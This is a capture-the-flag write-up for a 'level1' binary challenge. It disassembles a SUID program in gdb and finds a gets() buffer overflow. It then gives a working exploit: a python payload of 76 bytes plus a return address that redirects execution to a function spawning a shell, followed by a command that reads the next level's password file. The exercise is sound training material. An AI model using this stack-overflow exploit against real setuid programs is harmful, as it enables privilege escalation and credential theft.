We can see that the binary has the SUID (Set User ID) bit set and is owned by level2.

gdb ./level1

info functions shows us two interesting functions : main and run

(gdb) set disassembly-flavor intel

Then :
(gdb) disassemble main
(gdb) disassemble run

See [asm_analysis.md](Ressources/asm_analysis.md) for the complete ASM analysis.

The ASM analysis shows that the program essentially behaves like this:

void run(void)
{
    fwrite("Good... Wait what?\n", 1, 19, stdout);
    system("/bin/sh");
}

int main(void)
{
    char buffer[64];

    gets(buffer);

    return 0;
}

We notice the usage of the gets function.
This function is deprecated because it doesn't check the input size.
We can overflow the buffer to corrupt the stack.
We will use this method to change the value of the address of saved EIP (Extended Instruction Pointer) to make it point toward the run() function

python -c 'print "0"*76+"\x44\x84\x04\x08"' > /tmp/payload (explanation of the payload buffer size and value can be found in Ressources/asm_analysis.md)
cat /tmp/payload - | ./level1
cat /home/user/level2/.pass

#Note : We need to use cat with - so that the interactive shell launched in the run() function doesn't receive EOF and close instantly.